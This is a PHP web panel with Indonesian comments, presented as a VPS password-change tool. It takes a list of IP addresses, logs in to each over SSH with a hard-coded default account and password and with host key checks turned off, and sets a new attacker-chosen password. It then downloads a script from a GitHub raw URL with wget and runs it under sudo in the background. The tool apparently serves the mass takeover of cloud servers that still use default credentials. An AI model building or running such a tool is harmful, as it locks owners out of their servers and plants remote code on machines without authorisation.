<?php
// Konfigurasi default
$user = "cloudsigma";
$old_password = "Cloud2025";
$new_password = "Dotaja123@HHHH";

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $ips = $_POST['ips'] ?? '';

    if (!empty($ips)) {
        $ip_list = explode(",", $ips);

        header('Content-Type: text/html; charset=utf-8');
        echo "<pre style='background:black;color:#0f0;padding:15px;border-radius:8px;'>";
        ob_end_flush();
        ob_implicit_flush(true);

        foreach ($ip_list as $ip) {
            $ip = trim($ip);
            if (empty($ip)) continue;

            echo "🔹 VPS: $ip\n"; flush();

            // STEP 1: Login pakai password lama & ganti password
            echo "🔄 Mengganti password...\n"; flush();
            $cmd1 = "sshpass -p '$old_password' ssh -o StrictHostKeyChecking=no $user@$ip 'echo \"$user:$new_password\" | sudo chpasswd'";
            passthru($cmd1, $ret1);

            if ($ret1 === 0) {
                echo "✅ Password berhasil diganti, koneksi ditutup otomatis\n"; flush();
            } else {
                echo "❌ Gagal ganti password\n"; flush();
                continue;
            }

            // STEP 2: Login ulang pakai password baru & jalankan script via sudo
            echo "🔄 Login ulang pakai password baru...\n"; flush();
            $remote_cmd = "echo '$new_password' | sudo -S bash -c 'wget -O gas https://raw.githubusercontent.com/DOT-SUNDA/SOCKS/refs/heads/main/kontol.sh && chmod +x gas && nohup ./gas devnull &'";
            $cmd2 = "sshpass -p '$new_password' ssh -o StrictHostKeyChecking=no $user@$ip \"$remote_cmd\"";
            passthru($cmd2, $ret2);

            if ($ret2 === 0) {
                echo "✅ Script berhasil dijalankan via sudo su\n"; flush();
            } else {
                echo "❌ Gagal jalankan script setelah login ulang\n"; flush();
            }

            echo "--------------------------------------\n"; flush();
        }

        echo "</pre>";
        exit;
    }
}
?>
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <title>Panel Ganti Password VPS</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
</head>
<body class="bg-dark text-light">
<div class="container py-5">
    <div class="card shadow-lg p-4 bg-secondary text-light">
        <h2 class="mb-4">🔐 Panel Ganti Password VPS</h2>
        <form method="POST">
            <div class="mb-3">
                <label for="ips" class="form-label">Daftar IP (pisahkan dengan koma)</label>
                <input type="text" class="form-control" id="ips" name="ips" placeholder="contoh: 49.157.61.51,1.2.3.4" required>
            </div>
            <button type="submit" class="btn btn-primary">Jalankan</button>
        </form>
    </div>
</div>
</body>
</html>
